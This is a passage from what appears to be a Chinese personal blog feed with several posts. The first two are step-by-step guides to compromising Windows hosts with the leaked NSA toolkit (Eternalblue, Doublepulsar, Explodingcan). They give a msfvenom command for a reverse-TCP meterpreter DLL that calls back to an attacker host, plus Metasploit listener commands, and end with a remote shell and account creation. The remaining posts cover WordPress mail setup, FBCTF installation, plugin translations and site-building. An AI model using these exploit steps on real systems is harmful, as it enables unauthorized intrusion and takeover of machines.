class="hljs-keyword">set</span> <span class="hljs-comment">lport 5555</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">PAYLOAD windows</span>/meterpreter/<span class="hljs-comment">reverse_tcp</span><br>exploit<br></code></pre></td></tr></table></figure><p>看到如图即说明配置成功</p><img src="/2017/06/post164/2.jpg" class="" title="2.jpg"><p>这时就可以将xshell最小化，等后边再用</p><h4 id="第三步：使用方程式工具包进行攻击"><a href="#第三步：使用方程式工具包进行攻击" class="headerlink" title="第三步：使用方程式工具包进行攻击"></a>第三步：使用方程式工具包进行攻击</h4><p>0x01</p><p>将方程式工具包下的windows文件夹重命名为win，然后拷贝到C盘根目录下，并在该文件夹下新建一个名为”listeningposts”的文件夹，如图，不然运行会报错</p><img src="/2017/06/post164/5.jpg" class="" title="5.jpg"><p>0x02</p><p>打开命令提示符，输入</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">C:</span>\win\fb.py<br></code></pre></td></tr></table></figure><p>然后依次输入目标IP，本地IP，是否重定向，日志存放位置，新建工程，给该工程命名，最后确认，如图</p><img src="/2017/06/post164/1-16273798173061.jpg" class="" title="1.jpg"><p>最后敲击回车</p><p>0x03</p><p>显示出<code>fb &gt;</code>之后输入命令</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs actionscript"><span class="hljs-keyword">use</span> Explodingcan<br></code></pre></td></tr></table></figure><p>使用该工具，之后除了下图所示位置需要修改，其他都保持默认直接敲击回车即可</p><img src="/2017/06/post164/2-16273798424632.jpg" class="" title="2.jpg"><p>（选择系统，CallbackIP、CallbackPort等，端口可以任意设置）</p><img src="/2017/06/post164/3-16273798583573.jpg" class="" title="3.jpg"><p>之后都保存默认配置，攻击成功如图</p><img src="/2017/06/post164/4-16273798725894.jpg" class="" title="4.jpg">]]></content>
    
    
    
    <tags>
      
      <tag>网络安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>NSA工具包验证之SMB漏洞利用</title>
    <link href="/2017/06/post160/"/>
    <url>/2017/06/post160/</url>
    
    <content type="html"><![CDATA[<h3 id="验证环境："><a href="#验证环境：" class="headerlink" title="验证环境："></a>验证环境：</h3><p>攻击机1(本次演示IP：172.16.11.2)：windows系统，<a href="https://www.python.org/download/releases/2.6.6/">安装python2.6.6</a>, <a href="https://sourceforge.net/projects/pywin32/files/pywin32/Build%20221/">pywin32-221.win32-py2.6.exe</a>, xshell, xftp, <a href="https://codeload.github.com/misterch0c/shadowbroker/zip/master">下载方程式工具包</a>放到C盘，在工具包目录下的windows目录新建文件夹”listeningposts”，并且开放所有端口关闭防火墙，确保内网可以访问之</p><p>攻击机2(本次演示IP：172.16.12.2)：kali linux，需要开启ssh服务，详情百度</p><p>目标机1(本次演示IP：172.16.12.3)：开放了445端口的windows 7（windows2008与之攻击方法完全相同）</p><p>以上所有IP之间均可以直接访问</p><h3 id="验证步骤："><a href="#验证步骤：" class="headerlink" title="验证步骤："></a>验证步骤：</h3><span id="more"></span><hr><h4 id="第一步：生成可执行的恶意dll文件"><a href="#第一步：生成可执行的恶意dll文件" class="headerlink" title="第一步：生成可执行的恶意dll文件"></a>第一步：生成可执行的恶意dll文件</h4><p>0x01</p><p>首先通过xshell连接到kali linux，打开xshell，在跳出来的窗口点击new(新建)，然后填入kali的IP地址点击确定然后连接，接着依次输入kali的账号与密码即可连接，可能会跳出安全警告，点击接收并保存即可，连接完成得到如图：</p><img src="/2017/06/post160/1.jpg" class="" title="1.jpg"><p>0x02</p><p>执行命令：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p windows/x64/meterpreter/reverse_tcp <span class="hljs-attribute">LHOST</span>=172.16.12.2 <span class="hljs-attribute">LPORT</span>=5555 -f dll &gt; s.dll<br></code></pre></td></tr></table></figure><p>在kali根目录下生成s.dll文件，其中LHOST为kali的IP地址，LPORT为一个可任意填写的端口，届时将使目标机执行该dll向172.16.12.2:5555发送shell</p><p>0x03</p><p>点击xshell如图位置</p><img src="/2017/06/post160/3-162743458649210.jpg" class="" title="3.jpg"><p>打开本地C盘，并将kali目录下刚刚生成的s.dll复制到本机的C盘根目录下，如图</p><img src="/2017/06/post160/4.jpg" class="" title="4.jpg"><h4 id="第二步：配置kali使得kali处于监听状态"><a href="#第二步：配置kali使得kali处于监听状态" class="headerlink" title="第二步：配置kali使得kali处于监听状态"></a>第二步：配置kali使得kali处于监听状态</h4><p>0x01</p><p>依次输入命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfconsole<br>use exploit/multi/handler<br><span class="hljs-built_in">set</span> lhost 172.16.12.2<br><span class="hljs-built_in">set</span> lport 5555<br><span class="hljs-built_in">set</span> PAYLOAD windows/x64/meterpreter/reverse_tcp<br>exploit<br></code></pre></td></tr></table></figure><p>看到如图即说明配置成功</p><img src="/2017/06/post160/2.jpg" class="" title="2.jpg"><p>这时就可以将xshell最小化，等后边再用</p><h4 id="第三步：使用方程式工具包进行攻击"><a href="#第三步：使用方程式工具包进行攻击" class="headerlink" title="第三步：使用方程式工具包进行攻击"></a>第三步：使用方程式工具包进行攻击</h4><p>0x01</p><p>将方程式工具包下的windows文件夹重命名为win，然后拷贝到C盘根目录下，并在该文件夹下新建一个名为”listeningposts”的文件夹，如图，不然运行会报错</p><img src="/2017/06/post160/5.jpg" class="" title="5.jpg"><p>0x02</p><p>打开命令提示符，输入</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">C:</span>\win\fb.py<br></code></pre></td></tr></table></figure><p>然后依次输入目标IP，本地IP，是否重定向，日志存放位置，新建工程，给该工程命名，最后确认，如图</p><img src="/2017/06/post160/6.jpg" class="" title="6.jpg"><p>0x03</p><p>输入命令</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs actionscript"><span class="hljs-keyword">use</span> Eternalblue<br></code></pre></td></tr></table></figure><p>然后敲击回车，保持默认设置，除了下图俩需要选择，其他直接敲击回车使用默认配置即可</p><img src="/2017/06/post160/7.jpg" class="" title="7.jpg"><p>之后再敲几下回车开始攻击，得到结果如图</p><img src="/2017/06/post160/8.jpg" class="" title="8.jpg"><p>可以看到最后”Eternalblue Succeeded”显示成功，当然，不是所有攻击都会成功，需要一定运气的</p><p>0x04</p><p>输入命令</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs actionscript"><span class="hljs-keyword">use</span> Doublepulsar<br></code></pre></td></tr></table></figure><p>然后会要求输入一些参数，比如系统位数、后门操作、后门路径等，除了下图中红框标出的部分，其他保持默认即可</p><img src="/2017/06/post160/9.jpg" class="" title="9.jpg"><p>接着输入后门路径，即我们之前用kali生成的s.dll，如下图</p><img src="/2017/06/post160/10.jpg" class="" title="10.jpg"><p>之后不断敲击回车开始在目标机执行s.dll，成功后如图</p><img src="/2017/06/post160/11.jpg" class="" title="11.jpg"><p>这时打开xshell可以看到已经成功反弹shell</p><img src="/2017/06/post160/12.jpg" class="" title="12.jpg"><p>然后就可以比如说输入shell模拟终端执行命令，创建账户，等等，总之服务器权限已经拿到了</p><img src="/2017/06/post160/13.jpg" class="" title="13.jpg">]]></content>
    
    
    
    <tags>
      
      <tag>网络安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SEO Ultimate 7.6.5.9汉化版（中文版）免费下载</title>
    <link href="/2017/04/post045/"/>
    <url>/2017/04/post045/</url>
    
    <content type="html"><![CDATA[<p><strong>SEO Ultimate 7.6.5.9发布有一段时间了，到网上找了好久，唯一找到的汉化版还是付费才能用的，心里实在不爽，于是花了两天时间亲自汉化了这个程序，免费分享给大家。汉化主要结合谷歌翻译和自己的翻译能力，个别用到了百度翻译和有道翻译，希望大家能喜欢，谢谢！</strong></p><h4 id="汉化效果图1："><a href="#汉化效果图1：" class="headerlink" title="汉化效果图1："></a>汉化效果图1：</h4><span id="more"></span><img src="/2017/04/post045/1489136345234_8033_1489136340484-16274446365891.jpg" class="" title="1489136345234_8033_1489136340484"><h4 id="汉化效果图2："><a href="#汉化效果图2：" class="headerlink" title="汉化效果图2："></a>汉化效果图2：</h4><img src="/2017/04/post045/1489136351472_3072_1489136346786.jpg" class="" title="1489136351472_3072_1489136346786"><h3 id="点此下载最新汉化版"><a href="#点此下载最新汉化版" class="headerlink" title="点此下载最新汉化版"></a><a href="http://d52.pw/se">点此下载最新汉化版</a></h3><h3 id="匹配SEO-Ultimate-7-6-5-9以及之前多数版本，最后更新：2017-4-2"><a href="#匹配SEO-Ultimate-7-6-5-9以及之前多数版本，最后更新：2017-4-2" class="headerlink" title="匹配SEO Ultimate 7.6.5.9以及之前多数版本，最后更新：2017.4.2"></a>匹配SEO Ultimate 7.6.5.9以及之前多数版本，最后更新：2017.4.2</h3><h3 id="安装方法："><a href="#安装方法：" class="headerlink" title="安装方法："></a>安装方法：</h3><ol><li> 进入wordpress后台，下载并安装SEO Ultimate插件</li><li> 点击上边的下载链接下载并解压出seo-ultimate-zh_CN.mo</li><li> 上传到<br><code>/wp-content/plugins/seo-ultimate/translations/</code><br>目录下即可完成</li></ol><p>有的朋友会用到深层链接(Deeplink Juggernaut)功能，会发现不支持中文，请下载下边的str.zip解压并替换到<br><code>/wp-content/plugins/seo-ultimate/includes/jlfunctions/str.php</code><br>目录下就可以支持中文了</p><h3 id="点此下载str-zip"><a href="#点此下载str-zip" class="headerlink" title="点此下载str.zip"></a><a href="http://d52.pw/st">点此下载str.zip</a></h3>]]></content>
    
    
    
    <tags>
      
      <tag>分享</tag>
      
      <tag>汉化</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>在腾讯云服务器搭建FBCTF平台</title>
    <link href="/2017/03/post122/"/>
    <url>/2017/03/post122/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>之前有在虚拟机通过翻墙搭建了FBCTF平台，但是毕竟是虚拟机搭建的，只能在校园里网内使用，要让外网访问就需要做内网穿透了，麻烦而且不稳定，于是就想要在云服务器上搭建，由于开始思路就很正确，一次就成功了，具体方法如下：</p><h1 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h1><span id="more"></span><p>一、既然是在云服务器上搭建平台，首先自然得有一台腾讯云服务器，如果你的云服务器在国外，第二条就不用看了；<br>二、如果你的云服务器在国内的话，由于FBCTF的一个重要组件HHVM在墙外，所以首先需要准备一个墙外的服务器，必须选香港的！因为只有香港的才能复制镜像。不要包月了，没必要，直接按量计费，挑个2核4G100M的配置，整个计费过程不会花超过3块钱（除非你耗时太长），详细如下：<br>打开腾讯云官网注册账号并登录，点击如下位置选购服务器：</p><img src="/2017/03/post122/1490868089788_3722_1490868141823.png" class="" title="1490868089788_3722_1490868141823"><p>进入后后点击立即选购，然后选择配置，推荐如图：</p><img src="/2017/03/post122/1490868500670_5433_1490868552464.png" class="" title="1490868500670_5433_1490868552464"><p>继续选择镜像，注意必须选择如图：</p><img src="/2017/03/post122/1490868605811_3894_1490868657557.png" class="" title="1490868605811_3894_1490868657557"><p>继续选择网络，反正按量计费，任性如图：</p><img src="/2017/03/post122/1490868793378_32_1490868845254.png" class="" title="1490868793378_32_1490868845254"><p>之后选择安全组，默认全部放通即可，如图：</p><img src="/2017/03/post122/1490868922309_2467_1490868974049.png" class="" title="1490868922309_2467_1490868974049"><p>之后点击开通并等待它创建完成即可，通常1min之内创建完成。<br>三、如果需要下载汉化版，可以<a href="/2017/03/post106">点击这里下载</a></p><h1 id="开始安装"><a href="#开始安装" class="headerlink" title="开始安装"></a>开始安装</h1><p>一、下载putty（一款用于linux远程连接的软件），打开后输入公网IP如图操作：</p><img src="/2017/03/post122/1490869580023_6540_1490869632549.png" class="" title="1490869580023_6540_1490869632549"><p>之后在可能弹出的对话框里点确定，然后在弹出的黑底白字的界面依次输入你的服务器账号和密码（注意输入密码时不会显示，不要担心是自己没输入），得到如图：</p><img src="/2017/03/post122/1490869739455_8924_1490869791229.png" class="" title="1490869739455_8924_1490869791229"><p>二、输入（在putty里边选中就是复制，右键是粘贴)代码</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">sudo apt-<span class="hljs-built_in">get</span> install git<br></code></pre></td></tr></table></figure><p>然后敲击回车来安装git，中间会提示你是否安装，输入y后再敲击回车；<br>三、输入代码</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">git <span class="hljs-keyword">clone</span> <span class="hljs-title">https</span>://github.com/facebook/fbctf<br></code></pre></td></tr></table></figure><p>让服务器从GitHub拷贝fbctf源码到服务器；<br>四、下载FileZilla Client（一款FTP软件）并打开，点击左上角文件-站点管理器-新站点，然后如图操作，注意公网IP改为自己的：</p><img src="/2017/03/post122/1490870461850_3703_1490870513699.png" class="" title="1490870461850_3703_1490870513699"><p>之后就可以列出服务器目录如图：</p><img src="/2017/03/post122/1490870559582_9731_1490870611702.png" class="" title="1490870559582_9731_1490870611702"><p>之后依次打开<code>fbctf/src/language</code>，删除掉其中的<code>lang_zh-tw.php</code>，<a href="/2017/03/post106">点击这里下载汉化版</a>，解压并上传到该目录下，方法为从左边本地目录找到解压后的<code>lang_zh-cn.php</code>，拖到右边即可，如图：</p><img src="/2017/03/post122/1490870921303_9796_1490870973178.png" class="" title="1490870921303_9796_1490870973178"><p>五、打开putty输入代码cd fbctf敲击回车，再输入代码</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">.<span class="hljs-regexp">/extra/</span>provision.sh -m prod -c self -s <span class="hljs-variable">$PWD</span><br></code></pre></td></tr></table></figure><p>就可以开始安装了，如图：<br>开始：</p><img src="/2017/03/post122/1490871084939_2702_1490871136816.png" class="" title="1490871084939_2702_1490871136816"><p>约5min后：</p><img src="/2017/03/post122/1490871351041_397_1490871403200.png" class="" title="1490871351041_397_1490871403200"><p>约10min后：</p><img src="/2017/03/post122/1490871639018_965_1490871691164.png" class="" title="1490871639018_965_1490871691164"><p>约13min后安装完成，并打印出密码，务必记下（在putty里边选中就是复制，右键是粘贴)，如图：</p><img src="/2017/03/post122/1490871883914_832_1490871935828.png" class="" title="1490871883914_832_1490871935828"><h1 id="后续工作"><a href="#后续工作" class="headerlink" title="后续工作"></a>后续工作</h1><p>一、之后会有SSL证书问题，编辑<code>/etc/nginx/sites-available/fbctf.conf</code>这个文件即可，详细就不多说了，我的方法是在腾讯云申请SSL证书，然后下载并解压出nginx对应版本上传到<code>/home/ubuntu/ssl</code>目录下，然后编辑<code>/etc/nginx/sites-available/fbctf.conf</code><br>将证书目录修改为实际目录即可，注意修改这个文件需要root权限！<br>二、如果安装完之后想要修改源文件需要重新编译才能生效，可以参考<a href="/2017/03/post106">HBCTF博客</a>。<br>三、一切准备好之后就进入控制台把服务器关机，然后制作镜像，如图：</p><img src="/2017/03/post122/1490873146518_5896_1490873198860.png" class="" title="1490873146518_5896_1490873198860"><p><strong>制作完镜像记得销毁服务器以免产生不必要的费用</strong><br>四、将镜像跨地域复制到你的国内服务器所在区域，如图：</p><img src="/2017/03/post122/1490873286751_6136_1490873338723.png" class="" title="1490873286751_6136_1490873338723"><p>有时候一次不成功，需要多试几次，或者换个区域。<br>五、在国内的服务器上重装系统，在选择镜像时选择自定义镜像，然后就能看到你做好的镜像了</p><h1 id="至此完成，感谢阅读！"><a href="#至此完成，感谢阅读！" class="headerlink" title="至此完成，感谢阅读！"></a>至此完成，感谢阅读！</h1>]]></content>
    
    
    
    <tags>
      
      <tag>运维</tag>
      
      <tag>网络安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>FBCTF汉化简体中文免费下载，FBCTF更新缓存代码</title>
    <link href="/2017/03/post106/"/>
    <url>/2017/03/post106/</url>
    
    <content type="html"><![CDATA[<p><a href="http://d52.pw/fb">下载中文汉化版</a></p><h3 id="安装方法"><a href="#安装方法" class="headerlink" title="安装方法"></a>安装方法</h3><h3 id="已经安装成功平台，更新代码"><a href="#已经安装成功平台，更新代码" class="headerlink" title="已经安装成功平台，更新代码"></a>已经安装成功平台，更新代码</h3><ol><li><p> 点击上方链接下载并解压出lang_zh-cn.php</p></li><li><p> 上传到服务器根目录开始的</p><span id="more"></span><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/fbctf/</span>src<span class="hljs-regexp">/language/</span><br></code></pre></td></tr></table></figure><p>目录下</p></li><li><p> 重新编译(有人称之为更新缓存)</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">sudo</span> <span class="hljs-built_in">rm</span> /var/cache/hhvm/hhvm.hhbc<br><span class="hljs-built_in">sudo</span> hhvm-repo-mode <span class="hljs-built_in">enable</span> <span class="hljs-string">&quot;/var/www/fbctf&quot;</span><br><span class="hljs-built_in">sudo</span> <span class="hljs-built_in">chown</span> www-data:www-data /var/cache/hhvm/hhvm.hhbc<br><span class="hljs-built_in">sudo</span> service hhvm start<br><span class="hljs-built_in">sudo</span> service nginx restart<br></code></pre></td></tr></table></figure><h3 id="首次安装"><a href="#首次安装" class="headerlink" title="首次安装"></a>首次安装</h3></li><li><p> 在从github下载源码到服务器之后，开始安装FBCTF之前，点击上边链接下载并解压出lang_zh-cn.php</p></li><li><p> 放到你下载的<code>fbctf/src/language/</code><br>目录下，之后安装FBCTF<br>其他说明：因为“lang_zh-cn.php”和“lang_zh-tw.php”在后台管理中都显示为“中文/中文”，但是有一个简体有一个繁体，会造成不必要的麻烦，为避免这种情况，不需要繁体中文的用户可以删掉“lang_zh-tw.php”</p></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>分享</tag>
      
      <tag>汉化</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>wordpress发送邮件设置以及常见问题解决</title>
    <link href="/2017/03/post036/"/>
    <url>/2017/03/post036/</url>
    
    <content type="html"><![CDATA[<p>关于wordpress的搭建在我的另一篇文章”<a href="/2017/03/post5">一个小白的自学建站史（菜鸟建站入门）</a>“的文末已经有了较为详细的解答，需要的朋友可以参考下。本文主要针对于wordpress的邮件设置，以下所有均在wordpress4.7.3环境下进行。</p><h1 id="发送邮件设置"><a href="#发送邮件设置" class="headerlink" title="发送邮件设置"></a>发送邮件设置</h1><h3 id="开启WP-Mail-SMTP插件"><a href="#开启WP-Mail-SMTP插件" class="headerlink" title="开启WP-Mail-SMTP插件"></a>开启WP-Mail-SMTP插件</h3><p>wordpress原来的邮件设置是有些鸡肋的，通过main()函数来发送，且不说能不能发送成功，就算发送成功了，一般也很难进入别人的收件箱，或者连垃圾箱都进不去，所以在这里介绍一个著名的插件：WP-Mail-SMTP，我想多数人的wordpress都是使用这个插件。具体使用方法：</p><ol><li> 首先打开wordpress后台，点击左侧插件，点击安装插件，在右侧搜索插件WP-Mail-SMTP，如图：<span id="more"></span><img src="/2017/03/post036/1489036656329_6693_1489036653721.jpg" class="" title="1489036656329_6693_1489036653721"></li><li> 之后点击“现在安装”，然后启用，接着点击“设置(Settings)”，填入相关信息，如图：<img src="/2017/03/post036/1489038136450_9116_1489038133881.jpg" class="" title="1489038136450_9116_1489038133881"></li></ol><img src="/2017/03/post036/1489038144780_5977_1489038141615-16274447195962.jpg" class="" title="1489038144780_5977_1489038141615"><ol><li> 接着点击下面保存设置，然后可以发送一封测试邮件，试试是否可用，不可用接着往下看。</li></ol><h3 id="开启OpenSSL"><a href="#开启OpenSSL" class="headerlink" title="开启OpenSSL"></a>开启OpenSSL</h3><p>有些人在配置插件时选择SSL加密，却发现无法使用，配置为无加密就又可用了，这种情况通常是未开启OpenSSL，开启后就可解决问题，开启方法如下：</p><ol><li> 首先打开php目录下的”php.ini”，找到”extension=php_openssl.dll”看看前面有没有注释符”;”，有则去掉并保存；若是没有这句话则加上这句话之后保存；</li><li> 把php目录下的”ssleay32.dll”、”libeay32.dll”，以及php/ext目录下的”php_openssl.dll”拷贝到C:\Windows\System32目录下；</li><li> 重启Apache（或者IIS）。<br>注：Linux开启方法请自行百度。</li></ol><h3 id="解决Wordpress重设链接无效问题"><a href="#解决Wordpress重设链接无效问题" class="headerlink" title="解决Wordpress重设链接无效问题"></a>解决Wordpress重设链接无效问题</h3><p>很多朋友在wordpress重设密码时点击邮件中的链接会遇到会遇到重设链接无效的问题，仔细观察会看到链接最后有个”&gt;”，删掉就正常了，这是wordpress共有的BUG，很久以前就有了，不知道为什么现在还存在，但既然存在，那就有解决的办法，具体如下：</p><ol><li><p> 编辑wordpress目录下的wp-login.php，搜索：”rawurlencode($user_login)”，约在332行，将其所在行修改为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$message</span> .= <span class="hljs-title function_ invoke__">network_site_url</span>(<span class="hljs-string">&quot;wp-login.php?action=rp&amp;amp;amp;key=<span class="hljs-subst">$key</span>&amp;amp;amp;login=&quot;</span> . <span class="hljs-title function_ invoke__">rawurlencode</span>(<span class="hljs-variable">$user_login</span>), <span class="hljs-string">&#x27;login&#x27;</span>);<br></code></pre></td></tr></table></figure><p>如图：</p><img src="/2017/03/post036/1489039931247_5787_1489039928640.jpg" class="" title="1489039931247_5787_1489039928640"><p>并保存，其实就是把前面的”&lt;”和后边的”&gt;”删掉；</p></li><li><p> 打开wordpress目录下的wp-includes/pluggable.php，搜索network_site_url，约在1791行，修改为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$message</span> .= <span class="hljs-title function_ invoke__">network_site_url</span>(<span class="hljs-string">&quot;wp-login.php?action=rp&amp;amp;amp;key=<span class="hljs-subst">$key</span>&amp;amp;amp;login=&quot;</span> . <span class="hljs-title function_ invoke__">rawurlencode</span>(<span class="hljs-variable">$user</span>-&amp;gt;user_login), <span class="hljs-string">&#x27;login&#x27;</span>) . <span class="hljs-string">&quot;\r\n\r\n&quot;</span>;<br></code></pre></td></tr></table></figure><p>如图：</p><img src="/2017/03/post036/1489040354613_3175_1489040351578.jpg" class="" title="1489040354613_3175_1489040351578"><p>并保存，其实还是去掉了那对尖括号。<br>至此，wordpress已经可以发送邮件了，同时也支持了用户的自动注册。</p></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>运维</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>短网址</title>
    <link href="/2017/03/post009/"/>
    <url>/2017/03/post009/</url>
    
    <content type="html"><![CDATA[<h3 id="短网址系统免费开放，欢迎大佬们使用：DZ-GL-（短址过来）"><a href="#短网址系统免费开放，欢迎大佬们使用：DZ-GL-（短址过来）" class="headerlink" title="短网址系统免费开放，欢迎大佬们使用：DZ.GL （短址过来）"></a>短网址系统免费开放，欢迎大佬们使用：<a href="http://dz.gl/">DZ.GL</a> （短址过来）</h3><h3 id="该域名已经售出，继续提供源码下载"><a href="#该域名已经售出，继续提供源码下载" class="headerlink" title="该域名已经售出，继续提供源码下载"></a>该域名已经售出，继续提供源码下载</h3><h3 id="短网址系统已经开源，放在了百度网盘，需要的朋友可以下载。"><a href="#短网址系统已经开源，放在了百度网盘，需要的朋友可以下载。" class="headerlink" title="短网址系统已经开源，放在了百度网盘，需要的朋友可以下载。"></a>短网址系统已经开源，放在了百度网盘，需要的朋友可以下载。</h3><p><a href="https://pan.baidu.com/s/1eR406T8">下载源码</a></p><h3 id="最后更新于2017-02-21"><a href="#最后更新于2017-02-21" class="headerlink" title="最后更新于2017-02-21"></a>最后更新于2017-02-21</h3><h3 id="界面截图："><a href="#界面截图：" class="headerlink" title="界面截图："></a>界面截图：</h3><span id="more"></span><h4 id="桌面端："><a href="#桌面端：" class="headerlink" title="桌面端："></a>桌面端：</h4><img src="/2017/03/post009/1488598311743_9689_1488598309420.jpg" class="" title="1488598311743_9689_1488598309420"><img src="/2017/03/post009/1488598320047_5661_1488598316806.jpg" class="" title="1488598320047_5661_1488598316806"><img src="/2017/03/post009/1488598326592_8206_1488598323892.jpg" class="" title="1488598326592_8206_1488598323892"><h4 id="移动端："><a href="#移动端：" class="headerlink" title="移动端："></a>移动端：</h4><img src="post009/1488598333334_7893_1488598331854.png" alt="1488598333334_7893_1488598331854" style="zoom:50%;" /><img src="post009/1488598342796_3675_1488598342068.png" alt="1488598342796_3675_1488598342068" style="zoom:50%;" />]]></content>
    
    
    
    <tags>
      
      <tag>运维</tag>
      
      <tag>编程</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>一个小白的自学建站史（菜鸟建站入门）</title>
    <link href="/2017/03/post005/"/>
    <url>/2017/03/post005/</url>
    
    <content type="html"><![CDATA[<h1 id="接触"><a href="#接触" class="headerlink" title="接触"></a>接触</h1><h3 id="内网的尝试"><a href="#内网的尝试" class="headerlink" title="内网的尝试"></a>内网的尝试</h3><span id="more"></span><p>可能有点特别，我刚开始接触与网站相关是在一个关于DVWA这个漏洞系统的搭建上。那时破晓团队的创始人之一K0r4dji到我们学校来有一个讲座，他讲了很多看起来特别高大上的东西。演讲后有一个面基会，我就去参加并找到他，并表示想学一些网络安全技术，希望他能帮我引进门。他就给我介绍了很多东西，其中就包括了DVWA这个漏洞平台，于是百度安装方法，找到了一篇FreeBuf上的文章：<a href="http://www.freebuf.com/sectool/102661.html">新手指南：手把手教你如何搭建自己的渗透测试环境</a>接触到了xampp这款软件。但是安装了软件之后一脸懵逼，完全不懂，还好教程上边有详细的介绍，一步一步，虽然不理解，但是总归是成功安装了，在电脑上输入127.0.0.1/dvwa/login.php，成功进入！接下来问题就来了，我要如何让别人访问这个漏洞系统呢？教程写着：ip-address-of-windows-xp-machine/dvwa/login.php，于是我傻乎乎的在别的电脑上输入进去，结果不行，一番苦思冥想，终于尝试把“ip-address-of-windows-xp-machine”替换为我电脑内网的IP，成功了，有一点点小激动，也有了一些明悟，IP地址似乎就是相当于一台电脑的标志，每一台处于同一内网环境的电脑都有与其唯一对应的IP地址，通过这个IP可以访问这台电脑（服务器）的数据。之后我又尝试了用自己所学的HTML知识写了网页放到xampp\htdocs目录，然后访问该电脑的IP，果然可以打开网站，仿佛明白的从小到大一直在访问的网站的一点工作方法。</p><h3 id="公网服务器被黑"><a href="#公网服务器被黑" class="headerlink" title="公网服务器被黑"></a>公网服务器被黑</h3><p>之后偶然的一个机会得知了服务器运营商的存在，比如腾讯云、阿里云、百度云等等，于是我就在腾讯云上试用了一台服务器，用了windows系统，有5天时间，建议通过windows系统自带的远程桌面连接，方法为：</p><p>按组合键windows+R，并在运行中输入”mstsc”；</p><p>在跳出来的界面输入你的服务器公网IP地址，并按提示输入用户名和密码即可。<br>第一件事就是在上边安装了xampp，然后把xampp\htdocs目录下文件替换为DVWA，接着把IP地址放到了一个CTF交流群里，当天晚上，有个人在群里问我，这是你的网站吗？我说是，他说你改一个文件给我看看，我就改了，然后我的服务器就被黑客拿下了，还留了后门……这之后才知道DVWA是不能乱放的，不过起码到此为止，我已经可以建立一个外网可以访问的网站了。</p><h1 id="深入"><a href="#深入" class="headerlink" title="深入"></a>深入</h1><h3 id="有了模样"><a href="#有了模样" class="headerlink" title="有了模样"></a>有了模样</h3><p>我在阿里云的首页上看到有域名注册，于是尝试着注册了我的第一个域名：**_**_**.top（这个域名现在已经不用了，所以打码了），记得是1块钱首年，嘿嘿，但还是不知道要怎么才能使得访问域名就能访问服务器。因为一直自学，我花费了好几天时间，才知道有域名解析这种东西，于是点击域名管理，找到我的域名后点击解析，点击添加记录，主机记录用了www，记录值就填上了我腾讯云服务器的IP地址，然后访问www.<strong>_</strong>_**.top ，成功访问到了我的网站。再之后我开始自己手写网站，命名为1.html，放到服务器里，结果在我访问服务器的时候，浏览器直接列出了我的网站目录（xampp默认开启了目录列表，不然应该是403禁止访问），要手动点击1.html才能打开网站，这可别扭死了！如下图为列出目录</p><img src="/2017/03/post005/1488433467435_4319_1488433466589.jpg" class="" title="1488433467435_4319_1488433466589"><p>下图为403</p><img src="/2017/03/post005/1488433487113_5678_1488433485867.jpg" class="" title="1488433487113_5678_1488433485867"><p>然后尝试各种姿势百度，百度了好长好长时间（估计这种人尽皆知的东西都没人懒得说），才看到了被一句带过的index.html，于是把网页重命名为index.html（修改配置文件也是可以修改默认主页的)，成功了！至此，我的网站终于看起来像是一个网站了！如图为我当时建立网站之一：</p><img src="/2017/03/post005/1488432964695_8706_1488432964443.jpg" class="" title="1488432964695_8706_1488432964443"><h3 id="一服多站"><a href="#一服多站" class="headerlink" 